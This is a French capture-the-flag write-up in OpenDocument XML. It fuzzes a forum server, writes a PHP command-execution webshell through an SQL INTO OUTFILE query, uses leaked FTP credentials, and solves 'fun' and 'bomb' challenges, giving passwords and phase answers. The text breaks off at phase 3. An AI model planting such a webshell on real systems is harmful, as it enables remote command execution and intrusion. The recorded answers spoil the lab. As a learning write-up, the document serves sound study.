      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On ne peut cependant pas écrire dans ce path, et on ne trouve pas vraiment d'autres dossiers (à part </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">fonts</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, mais pareil on a </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">Err 13</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">). On fuzz un peu le path </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">/forum</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> et on trouve un certain nombre de fichiers et directories :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">.htpasswd <text:s text:c="14"/>[Status: 403, Size: 295, Words: 21, Lines: 11]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">.htaccess <text:s text:c="14"/>[Status: 403, Size: 295, Words: 21, Lines: 11]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">backup <text:s text:c="17"/>[Status: 403, Size: 292, Words: 21, Lines: 11]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">config <text:s text:c="17"/>[Status: 403, Size: 292, Words: 21, Lines: 11]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">images <text:s text:c="17"/>[Status: 301, Size: 319, Words: 20, Lines: 10]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">includes <text:s text:c="15"/>[Status: 301, Size: 321, Words: 20, Lines: 10]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">js <text:s text:c="21"/>[Status: 301, Size: 315, Words: 20, Lines: 10]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">lang <text:s text:c="19"/>[Status: 301, Size: 317, Words: 20, Lines: 10]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">modules <text:s text:c="16"/>[Status: 301, Size: 320, Words: 20, Lines: 10]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">index <text:s text:c="18"/>[Status: 200, Size: 4935, Words: 310, Lines: 81]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">templates_c <text:s text:c="12"/>[Status: 301, Size: 324, Words: 20, Lines: 10]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">themes <text:s text:c="17"/>[Status: 301, Size: 319, Words: 20, Lines: 10]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">update <text:s text:c="17"/>[Status: 301, Size: 319, Words: 20, Lines: 10]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On tente d'upload notre fichiers dans tous ces directories, pour voir si éventuellement notre utilisateur actuel n'aurait pas les droits d'écriture dans l'un d'entre eux. Et il se trouve qu'en effet, on peut écrire dans le dossier </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">/forum/templates_c</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T14">SELECT "&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD="GET" NAME="myform" ACTION=""&gt;&lt;INPUT TYPE="text" NAME="cmd"&gt;&lt;INPUT TYPE="submit" VALUE="Send"&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;?php if($_GET['cmd']) {system($_GET['cmd']);} ?&gt; &lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt;"</text:span></text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T14">INTO OUTFILE '/var/www/forum/templates_c/cmd.php'</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On y upload notre webshell, à laquelle on peut désormais accéder à l'URL :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">https://192.168.1.7/forum/templaces_c/cmd.php</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images3" text:anchor-type="paragraph" svg:width="18.348cm" svg:height="5.299cm" draw:z-index="2"><draw:image xlink:href="Pictures/2000000700004E09000016890BD9B598.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><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3">&gt;&gt;&gt; FTP CREDS AND ENUMERATION</text:span></text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T11"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On pourrait, d'ici, upload une reverse shell et l'exécuter. Cependant, avant qu'on ne le fasse, une énumération superficielle nous fait remarquer le dossier </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">/home/LOOKATME</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">. A l'intérieur de celui-ci, un fichier </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">password</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> qui contient simplement des credentials :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">lmezard:G!@M6f4Eatau{sF"</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Ces credentials ne fonctionnent pas en ssh, mais nous permettent cependant de nous connecter au serveur </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">FTP</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On voit que ce serveur contient simplement deux fichiers, </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">README</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> (assez léger) et </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">fun</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> (fichier assez conséquent). Le fichier README nous indique simplement que le fichier 'fun' contient un petit challenge qui nous révélera un mot de passe nous permettant de nous connecter via SSH en tant que l'utilisateur </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">laurie</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images4" text:anchor-type="paragraph" svg:width="12.838cm" svg:height="6.609cm" draw:z-index="3"><draw:image xlink:href="Pictures/200000070000343200001AE069C7935A.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On télécharge les fichiers sur notre machine locale.</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11">&gt;&gt;&gt; 'FUN' CHALLENGE</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Le challenge contenu dans le fichier 'fun' n'était pas extrêmement intéressant. Le fichier était une </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">archive tar</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, qu'on décompresse (tar -xvf fun). On se retrouve avec un dossier </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">ft_fun</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> composé de plein de fichiers </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">XXXXX.pcap</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">. Ces fichiers, malgré leur extension, ne sont même pas des fichiers pcap, mais simplement des fichiers contenant du texte ASCII.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Dans la liste, un de ces fichiers était bien plus gros que les autres. En l'affichant, on a pas mal de messages identiques inutiles, mais au milieu on trouve :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">int main() {</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("M");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("Y");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf(" ");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("P");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("A");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("S");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("S");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("W");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("O");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("R");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("D");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf(" ");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("I");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("S");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf(":");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf(" ");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("%c",getme1());</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("%c",getme2());</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("%c",getme3());</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("%c",getme4());</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("%c",getme5());</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("%c",getme6());</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("%c",getme7());</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("%c",getme8());</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("%c",getme9());</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("%c",getme10());</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("%c",getme11());</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("%c",getme12());</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("\n");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s text:c="8"/>printf("Now SHA-256 it and submit");</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">}</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Le jeu consiste ici à savoir le caractère retourné par les différentes fonctions </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">getme</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">. Les fonctions 8, 9, 10, 11 et 12 étaient données :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images5" text:anchor-type="paragraph" svg:x="0.071cm" svg:y="0.275cm" svg:width="6.643cm" svg:height="8.281cm" draw:z-index="4"><draw:image xlink:href="Pictures/20000007000019F20000205A90ECC869.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Pour les autres fonctions, on voit que la définition de la fonction n'est suivie par rien ; mais qu'on a un numéro de fichier à la fin de chaque fichier :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images6" text:anchor-type="paragraph" svg:x="0.018cm" svg:y="0.222cm" svg:width="5.479cm" svg:height="1.64cm" draw:z-index="5"><draw:image xlink:href="Pictures/200000070000156600000669B0DB1B8E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Pour chacune de ces fonctions </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">getme</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> incomplètes, on affiche simplement le fichier suivant (en cherchant avec un </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">grep</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">file6</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">), et on récupère le caractère associé :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images7" text:anchor-type="paragraph" svg:x="0.032cm" svg:y="0.169cm" svg:width="9.313cm" svg:height="1.616cm" draw:z-index="6"><draw:image xlink:href="Pictures/20000007000024620000064FA171D656.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On fait ça pour tous les </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">getme</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, et on récupère le mot de passe (</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Iheartpwnage</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">), qu'on passe à l'algorithme SHA-256, puis on se connecte via SSH en tant que l'utilisateur </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">laurie</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T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3">&gt;&gt;&gt; LAURIE USER : 'BOMB' CHALLENGE</text:span></text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T11"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Une fois connecté en tant que cet utilisateur, on a un README qui nous indique qu'on doit résoudre le challenge du binaire </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">bomb</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> et utiliser les strings de résolution du challenge comme mot de passe pour l'utilisateur </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">thor</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">. On a également indiqué dans ce README des "indices" pour chaque phase du binaire :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">HINT:</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">P</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s/>2</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"><text:s/>b</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">o</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">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En lançant le binaire, on voit un message nous indiquant qu'il existe 6 phases, à chacune desquelles on doit entrer le bon string afin de ne pas faire exploser la bombe. Si un string incorrect est indiqué, le programme quitte.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On a désassemblé et ré-écrit les parties pertinentes du programme à partir de l'assembleur (fichier </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">bomb.c </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">dans les ressources).</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">&gt;&gt; </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T6">Phase 1 code source</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7"/></text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">void</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T15"> <text:s text:c="3"/></text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T30">phase_1</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T24">(</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">char</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T15"> </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T24">*input)</text:span></text:span></text:p>
      <text:p text:style-name="P21">{</text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:span text:style-name="T23">n;</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">n</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">strings_not_equal(input,</text:span> <text:span text:style-name="T36">"Public speaking is very easy."</text:span><text:span text:style-name="T23">);</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(n</text:span> <text:span text:style-name="T23">!=</text:span> <text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">return</text:span> <text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P15">}</text:p>
      <text:p text:style-name="P3">Réponse à la phase 1 : "<text:span text:style-name="T2">Public speaking is very easy.</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gt;&gt; </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T6">Phase 2 source</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7"/></text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">void</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T15"> <text:s text:c="3"/></text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T30">phase_2</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T24">(</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">char</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T15"> </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T24">*input)</text:span></text:span></text:p>
      <text:p text:style-name="P21">{</text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">c;</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">a[</text:span><text:span text:style-name="T28">7</text:span><text:span text:style-name="T23">];</text:span></text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P19"><text:s text:c="8"/><text:span text:style-name="T23">read_six_numbers(input,</text:span> <text:span text:style-name="T23">a</text:span> <text:span text:style-name="T23">+</text:span> <text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">);</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="8"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(a[</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">]</text:span> <text:span text:style-name="T23">!=</text:span> <text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="16"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="8"/><text:span text:style-name="T23">c</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="8"/><text:span text:style-name="T33">while</text:span> <text:span text:style-name="T23">(c</text:span> <text:span text:style-name="T23">&lt;</text:span> <text:span text:style-name="T28">6</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="8"/><text:span text:style-name="T23">{</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="16"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(a[c</text:span> <text:span text:style-name="T23">+</text:span> <text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">]</text:span> <text:span text:style-name="T23">!=</text:span> <text:span text:style-name="T23">(c</text:span> <text:span text:style-name="T23">+</text:span> <text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span> <text:span text:style-name="T23">*</text:span> <text:span text:style-name="T23">a[c])</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="24"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="16"/><text:span text:style-name="T23">c++;</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="8"/><text:span text:style-name="T23">}</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="8"/><text:span text:style-name="T33">return</text:span> <text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P14">}</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">Pour c=1 :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">a[2] = (2) * a[1]<text:tab/><text:tab/>--&gt; 2</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">Pour c=2 :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">a[3] = (3) * a[2]<text:tab/><text:tab/>--&gt; 6</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">etc...</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">Réponse à la phase 2 : "</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">1 2 6 24 120 720</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">"</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gt;&gt; </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T6">Phase 3 source</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7"/></text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">void</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T15"> <text:s text:c="3"/></text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T30">phase_3</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T24">(</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">char</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T15"> </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T24">*input)</text:span></text:span></text:p>
      <text:p text:style-name="P21">{</text:p>
